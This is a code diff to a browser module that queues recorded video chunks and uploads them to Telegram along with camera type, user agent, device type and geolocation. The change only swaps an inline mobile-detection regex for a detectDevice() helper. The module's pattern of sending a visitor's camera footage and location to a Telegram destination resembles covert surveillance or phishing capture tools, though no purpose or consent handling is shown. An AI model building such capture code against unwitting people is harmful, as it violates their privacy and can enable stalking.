@@ -1,4 +1,5 @@
 import { addChunkToQueue, getQueuedChunks, removeChunkFromQueue, incrementRetryCount, clearOldChunks } from './chunkQueue';
+import { detectDevice } from './deviceInfo';
 
 // Configuration
 const MAX_RETRIES = 3;
@@ -112,7 +113,7 @@ export const sendVideoToTelegram = async (
     formData.append('chunkNumber', chunkNumber.toString());
     formData.append('cameraType', cameraType);
     formData.append('userAgent', navigator.userAgent);
-    formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
+    formData.append('device', detectDevice());
     
     // Add geolocation if available
     if (geoData) {
@@ -195,7 +196,7 @@ export const processVideoQueue = async (): Promise<void> => {
       formData.append('chunkNumber', chunk.chunkNumber.toString());
       formData.append('cameraType', chunk.cameraType);
       formData.append('userAgent', navigator.userAgent);
-      formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
+      formData.append('device', detectDevice());
       
       if (chunk.geoData) {
         formData.append('latitude', chunk.geoData.latitude.toString());
